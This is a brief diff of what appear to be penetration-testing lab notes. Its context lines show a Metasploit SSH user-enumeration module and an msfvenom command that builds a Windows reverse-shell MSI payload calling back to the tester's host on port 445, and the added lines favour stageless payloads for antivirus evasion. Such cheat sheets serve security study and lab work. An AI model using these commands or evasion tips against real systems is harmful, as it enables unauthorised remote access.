@@ -18,3 +18,7 @@ msf> use auxiliary/scanner/ssh/ssh_enumusers
 ```shell-session
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f msi > shell.msi
 ```
+
+# Stageless Payload
+- Sometimes better for #av-evasion 
+- More stable than staged if bandwidth/latency issues
